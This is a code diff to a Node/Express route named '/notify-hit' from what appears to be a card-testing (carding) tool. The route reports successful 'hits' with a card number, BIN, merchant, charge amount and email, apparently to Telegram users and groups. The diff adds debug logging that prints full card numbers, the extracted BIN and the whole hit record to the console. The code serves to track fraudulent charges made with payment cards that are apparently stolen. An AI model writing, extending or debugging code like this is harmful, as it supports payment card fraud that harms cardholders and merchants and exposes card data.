@@ -784,6 +784,9 @@ router.post('/notify-hit', async (req, res) => {
   console.log('[HIT_NOTIFICATION] About to send personal message with merchant:', merchantName);
   console.log('[HIT_NOTIFICATION] current_url received:', current_url);
   console.log('[HIT_NOTIFICATION] business_url received:', business_url);
+  console.log('[HIT_NOTIFICATION] card received:', card);
+  console.log('[HIT_NOTIFICATION] cardDisplay:', cardDisplay);
+  console.log('[HIT_NOTIFICATION] cleanCard:', cleanCard);
 
   const hitText = `🎯 <b>HIT DETECTED</b>\n` +
     `─────────────────\n\n` +
@@ -827,6 +830,7 @@ router.post('/notify-hit', async (req, res) => {
 
   // Extract real amount from displayAmount for groups (extract number before currency symbol)
   let realAmount = '0.00';
+  console.log('[HIT_NOTIFICATION] displayAmount for groups:', displayAmount);
   if (displayAmount && displayAmount !== 'Free Trial' && displayAmount !== '—') {
     // Extract the numeric part (before currency symbol)
     const amountMatch = displayAmount.match(/^([\d.]+)/);
@@ -834,12 +838,16 @@ router.post('/notify-hit', async (req, res) => {
       realAmount = parseFloat(amountMatch[1]).toFixed(2);
     }
   }
+  console.log('[HIT_NOTIFICATION] realAmount for groups:', realAmount);
+
+  const extractedBin = cleanCard ? extractBinFromCard(cleanCard) : 'Unknown';
+  console.log('[HIT_NOTIFICATION] extractedBin:', extractedBin);
 
   const hitData = {
     userId: tgId,
     userName: userName,
     card: cleanCard || 'Unknown',
-    bin: cleanCard ? extractBinFromCard(cleanCard) : 'Unknown',
+    bin: extractedBin,
     binMode: binMode,
     email: emailDisplay !== '—' ? emailDisplay : null,
     amount: displayAmount !== 'Free Trial' && displayAmount !== '—' ? displayAmount : '0.00',
@@ -847,6 +855,8 @@ router.post('/notify-hit', async (req, res) => {
     timeTaken: timeDisplay,
     merchant: merchantName // Use extracted merchant name
   };
+
+  console.log('[HIT_NOTIFICATION] hitData constructed:', hitData);
 
     console.log('[HIT_NOTIFICATION] Constructed hitData:', JSON.stringify(hitData, null, 2));
     console.log('[HIT_NOTIFICATION] Final merchant name:', merchantName);
